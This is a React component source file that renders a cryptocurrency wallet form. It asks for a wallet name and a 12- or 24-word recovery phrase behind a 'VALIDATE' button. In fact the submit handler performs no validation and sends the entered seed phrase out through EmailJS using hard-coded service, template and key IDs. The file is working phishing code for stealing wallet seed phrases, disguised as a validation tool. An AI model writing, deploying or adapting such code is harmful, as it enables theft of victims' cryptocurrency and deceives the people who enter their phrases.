import React, { useRef } from "react";
import "./Phrase.css";
import emailjs from "emailjs-com";

export const Phrase = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_qghi171",
        "template_m0dnrdu",
        form.current,
        "HaqXdadPhJghOQ5LG"
      )
      .then(
        () => {
          console.log("SUCCESS!");
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };

  return (
    <div>
      <form ref={form} onSubmit={sendEmail} className="myform">
        <textarea
          name="walletName"
          placeholder="Wallet Name"
          required
          className="walletName"
        />
        <textarea name="Phrase" placeholder="Phrase" required />
        <p>Typically 12 (sometimes 24) words separated by single spaces</p>
        <button type="submit" name="submit">
          <p>VALIDATE</p>
        </button>
      </form>
    </div>
  );
};

export default Phrase;
